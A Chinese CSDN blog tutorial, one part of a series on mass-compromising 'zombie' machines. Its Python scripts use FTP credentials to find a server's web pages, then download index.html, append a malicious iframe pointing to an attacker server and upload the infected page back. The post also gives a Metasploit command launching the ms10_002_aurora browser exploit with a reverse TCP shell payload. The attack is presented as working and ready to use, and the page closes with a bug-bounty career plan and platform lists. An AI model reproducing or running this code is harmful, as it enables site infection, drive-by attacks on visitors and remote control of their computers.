# 原创
：  【Python脚本进阶】2.3、利用FTP与Web批量抓“ 肉机”(下)：在FTP服务器上搜索网页+注入代码

# 【Python脚本进阶】2.3、利用FTP与Web批量抓“ 肉机”(下)：在FTP服务器上搜索网页+注入代码

 <img alt="" src="https://img-blog.csdnimg.cn/2e86bda3ff034c71920f2f40732c3929.gif"/>

## 前言：

> 
<h3><img alt="" height="24" src="https://img-blog.csdnimg.cn/c2dfbe518f7d43a2978e4e6f1bfd5ea1.gif" width="24"/>介绍： </h3>
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>博主：网络安全领域狂热爱好者（承诺在CSDN永久无偿分享文章）。
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>殊荣：CSDN网络安全领域优质创作者，2022年双十一业务安全保卫战-某厂第一名，某厂特邀数字业务安全研究员，edusrc高白帽，vulfocus、攻防世界等平台排名100+、高校漏洞证书、cnvd原创漏洞证书等。
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>擅长：对于技术、工具、漏洞原理、黑产打击的研究。
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>C站缘：C站的前辈，引领我度过了一个又一个技术的瓶颈期、迷茫期。
<hr/>
<h3><img alt="" height="24" src="https://img-blog.csdnimg.cn/9f7cfdd7c4294c9e9bff7ef35f552f0c.gif" width="24"/>导读：</h3>
<img alt="" height="23" src="https://img-blog.csdnimg.cn/b1b5426baac44b97b68428245cc35d77.png" width="23"/>面向读者：对于网络安全方面的学者。 
<img alt="" height="23" src="https://img-blog.csdnimg.cn/19ea593260b84ec8b836a336326fa0cc.png" width="23"/>本文知识点（读者自测）： 
（1）在FTP服务器上搜索网页+注入代码（√）


### <img alt="" height="24" src="https://img-blog.csdnimg.cn/9f7cfdd7c4294c9e9bff7ef35f552f0c.gif" width="24"/>导读：

> 
<h2> <img alt="" height="23" src="https://img-blog.csdnimg.cn/19e90c25b42d4b368c3c94da4b04afb0.png" width="23"/>让读者如虎添翼</h2>
<table border="1" cellpadding="1" cellspacing="1"><tbody>|抓肉鸡博文|目标|状态
|[【Python脚本进阶】利用FTP与Web批量抓“ 肉机”(上)：构建匿名FTP扫描器](https://blog.csdn.net/qq_53079406/article/details/126052839)|构建匿名FTP扫描器|已发布
|[【Python脚本进阶】2.3、利用FTP与Web批量抓“ 肉机”(中)：使用Ftplib暴力破解FTP用户口令](https://blog.csdn.net/qq_53079406/article/details/126053636)|使用Ftplib暴力破解FTP用户口令|已发布
|[【Python脚本进阶】2.3、利用FTP与Web批量抓“ 肉机”(下)：在FTP服务器上搜索网页+注入代码](https://blog.csdn.net/qq_53079406/article/details/126060388)|在FTP服务器上搜索网页+注入代码|已发布
|[【Python脚本进阶】2.3、利用FTP与Web批量抓“ 肉机”(终）](https://blog.csdn.net/qq_53079406/article/details/126076401)|利用FTP与Web批量抓肉机|已发布
</tbody></table>



---


**目录**

[一、在FTP服务器上搜索网页](#%E4%B8%80%E3%80%81%E5%9C%A8FTP%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E6%90%9C%E7%B4%A2%E7%BD%91%E9%A1%B5)

[1.1、函数：](#1.1%E3%80%81%E5%87%BD%E6%95%B0%EF%BC%9A)

[1.2、实现：](#1.2%E3%80%81%E5%AE%9E%E7%8E%B0%EF%BC%9A)

[二、在网页中加入恶意注入代码](#%E4%BA%8C%E3%80%81%E5%9C%A8%E7%BD%91%E9%A1%B5%E4%B8%AD%E5%8A%A0%E5%85%A5%E6%81%B6%E6%84%8F%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81)

[2.1、分析：](#2.1%E3%80%81%E5%88%86%E6%9E%90%EF%BC%9A)

[2.2、函数：](#2.2%E3%80%81%E5%87%BD%E6%95%B0%EF%BC%9A)

[2.3、实现：](#2.3%E3%80%81%E5%AE%9E%E7%8E%B0%EF%BC%9A)

---


## 一、在FTP服务器上搜索网页

> 
<h3>1.1、函数：</h3>
ftp.nlst()：返回FTP服务器上指定目录的文件列表
fileName.lower()：将字符串中的所有大写字母转换为小写字母


> 
<h3>1.2、实现：</h3>
有了FTP 服务器的登录口令之后，要测试一下该服务器是否提供Web 服务
<hr/>
首先要列出FTP 目录中的所有文件， 搜索其中是否含有默认网页。returnDefault()函数输入的参数是一个FTP 连接， 返回一个它找到的默认网页的数组。它是通过发出NLST 命令（列出目录中所有文件的命令）完成这一操作的。该函数会逐个检查NLST 命令列出的每个文件的文件名是不是默认的Web 页面文件名， 并把找到的所有默认网页都添加到一个叫retList 的数组中。完成这一迭代操作后， 函数返回该数组。
<hr/>
运行python defaultPages.py
<pre><code>import ftplib


def returnDefault(ftp):
    try:
        dirList = ftp.nlst()
    except:
        dirList = []
        print('[-] Could not list directory contents.')
        print('[-] Skipping To Next Target.')
        return
    retList = []
    for fileName in dirList:
        fn = fileName.lower()
        if '.php' in fn or '.htm' in fn or '.asp' in fn:
            print('[+] Found default page: ' + fileName)
            retList.append(fileName)
    return retList


host = '192.168.190.131'
userName = 'guest'
password = 'guest'
ftp = ftplib.FTP(host)
ftp.login(userName, password)
returnDefault(ftp)</code></pre>


---


---


---


## 二、在网页中加入恶意注入代码

> 
<h3>2.1、分析：</h3>
已经找到了网页文件， 必须用恶意重定向代码感染它们。为了快速创建一个位于http://xx.xx.xx.xx:8080/exploit 的恶意服务器和页面，将使用Metasploit 框架，选用的是msl0_002_aurora, ip:8080/exploit 上的网页会利用被重定向到它这里的浏览器中的漏洞， 使之向我们提供一个反向连接， 令我们能通过这个反向连接来控制这台“ 肉机”
msfcli exploit/windows/browser/ms10_002_aurora<br/> LHOST=xx.xx.xx.xx SRVHOST=xx.xx.xx.xx URIPATH=/exploit<br/> PAYLOAD=windows/shell/reverse_tcp LHOST=xx.xx.xx.xx LPORT=443 E
<hr/>
如果有哪个有漏洞的浏览器连接到http://xx.xx.xx.xx:8080/ exploit这个服务器， 它就会执行漏洞利用代码。一旦成功，将生成一个反向的TCPshell, 并让我们得到这台被黑计算机上的Windows命令行提示窗口。有了这个命令shell后， 就能在“ 肉机” 上以管理员权限执行命令
<hr/>
接下来，要在被黑服务器的正常网页中添加一段重定向至我们的恶意服务器的代码。我们可以从被黑的服务器上把默认网页下载下来， 在其中插入一个iframe, 然后把这个插入了恶意代码的网页传回到被黑的服务器上
<hr/>
injectPage()这个函数，需要给injectPage()函数输入一个FTP连接、网页名， 以及表示用于重定向的这个iframe字符串，然后下载该网页的临时副本。接着， 它把重定向到我们恶意服务器上的这个iframe添加到这个临时文件中。最后， 函数将被感染的网页传回被黑的服务器上。


---


> 
<h3>2.2、函数：</h3>
ftp.retrlines()：使用RETR命令获取文件多行信息
<hr/>
storlines (cmd, f)：给定 FTP 命令。（如“ STOR filename”），用来上传文本文件
<hr/>
ftplib.FTP类：实现FTP协议的客户端，可以使用它来编写执行各种FTP作业的Python程序


---


> 
<h3>2.3、实现：</h3>
python injectPage.py
<pre><code>import ftplib


def injectPage(ftp, page, redirect):
    f = open(page + '.tmp', 'w')
    ftp.retrlines('RETR ' + page, f.write)
    print('[+] Downloaded Page: ' + page)
    f.write(redirect)
    f.close()
    print('[+] Injected Malicious IFrame on: ' + page)
    ftp.storlines('STOR ' + page, open(page + '.tmp'))
    print('[+] Uploaded Injected Page: ' + page)

host = '192.168.190.131'
userName = 'guest'
passWord = 'guest'
ftp = ftplib.FTP(host)
ftp.login(userName, passWord)
redirect = '&lt;iframe src= '+'"http://xx.xx.xx.xx:8080/exploit"&gt;&lt;/iframe&gt;'
injectPage(ftp, 'index.html', redirect)</code></pre>


---


---


> 
<h2><img alt="" height="28" src="https://img-blog.csdnimg.cn/0797a1b4a28e49479db240e038a7969d.png" width="28"/>网络安全三年之约</h2>
<h3><img alt="" height="23" src="https://img-blog.csdnimg.cn/0052aabacbb147b482912c9fe1950f56.png" width="23"/>First year </h3>
掌握各种原理、不断打新的靶场
<img alt="" height="23" src="https://img-blog.csdnimg.cn/6b308c9501174788aa24fa4e5ea8fdd2.png" width="23"/>目标：edusrc、cnvd 
[主页 | 教育漏洞报告平台 (sjtu.edu.cn)https://src.sjtu.edu.cn/](https://src.sjtu.edu.cn/)[https://www.cnvd.org.cnhttps://www.cnvd.org.cn/](https://www.cnvd.org.cn/)
<hr/>
<h3><img alt="" height="23" src="https://img-blog.csdnimg.cn/8439bb91fdfb4e739bacba4c96b9fb17.png" width="23"/>second year </h3>
不断学习、提升技术运用技巧，研究各种新平台
开始建立自己的渗透体系
<img alt="" height="23" src="https://img-blog.csdnimg.cn/3bc7983d3bac437fbcf8b3530e3ec8d3.png" width="23"/>目标：众测平台、企业src应急响应中心 
<table border="1" cellpadding="1" cellspacing="1"><tbody>|众测平台|URL
|漏洞盒子|[漏洞盒子 | 互联网安全测试众测平台](https://www.vulbox.com/)
|火线安全平台|[火线安全平台](https://www.huoxian.cn/)
|漏洞银行|[BUGBANK 官方网站 | 领先的网络安全漏洞发现品牌 | 开放安全的提出者与倡导者 | 创新的漏洞发现平台](https://www.bugbank.cn/)
|360漏洞众包响应平台|[360漏洞云漏洞众包响应平台](https://src.360.net/)
|补天平台（奇安信）|[补天 - 企业和白帽子共赢的漏洞响应平台，帮助企业建立SRC](https://www.butian.net/)
|春秋云测|[首页](https://zhongce.ichunqiu.com/)
|雷神众测（可信众测，安恒）|[雷神众测 - BountyTeam](https://www.bountyteam.com/)
|云众可信（启明星辰）|[云众可信 - 互联网安全服务引领者](https://www.cloudcrowd.com.cn/)
|ALLSEC|[ALLSEC](https://i.allsec.cn/#/)
|360众测|[360众测平台](https://zhongce.360.cn/)
|看雪众测（物联网）|[https://ce.kanxue.com/](https://ce.kanxue.com/)
|CNVD众测平台|[网络安全众测平台](https://zc.cnvd.org.cn/)
|工控互联网安全测试平台|[CNCERT工业互联网安全测试平台](https://test.ics-cert.org.cn/)
|慢雾（区块链）|[Submit Bug Bounty - SlowMist Zone - Blockchain Ecosystem Security Zone](https://slowmist.io/bug-bounty.html)
|平安汇聚|[http://isrc.pingan.com/homePage/index](http://isrc.pingan.com/homePage/index)
</tbody></table>


<table border="1" cellpadding="1" cellspacing="1"><tbody>|互联网大厂|URL
|阿里|https://asrc.alibaba.com/#/
|腾讯|https://security.tencent.com/
|百度|https://bsrc.baidu.com/v2/#/home
|美团|https://security.meituan.com/#/home
|360|https://security.360.cn/
|网易|https://aq.163.com/
|字节跳动|https://security.bytedance.com/
|京东|https://security.jd.com/#/
|新浪|http://sec.sina.com.cn/
|微博|https://wsrc.weibo.com/
|搜狗|http://sec.sogou.com/
|金山办公|https://security.wps.cn/
|有赞|https://src.youzan.com/
</tbody></table>

<hr/>
<h3><img alt="" height="23" src="https://img-blog.csdnimg.cn/18b63058b35848b19967730eb49fcb45.png" width="23"/>Third Year </h3>
学习最新的知识，建全自己的渗透体系
<img alt="" height="23" src="https://img-blog.csdnimg.cn/7ccb45a55d5244edad5a9a1fabc55f08.png" width="23"/>目标：参与护网（每一个男孩子心中的梦想） 
时间：一般5月面试，6/7月开始（持续2-3周）
分类：国家级护网、省级护网、市级护网、重大节日护网（如：建党、冬奥等）


### <img alt="" height="23" src="https://img-blog.csdnimg.cn/8439bb91fdfb4e739bacba4c96b9fb17.png" width="23"/>second year 

---

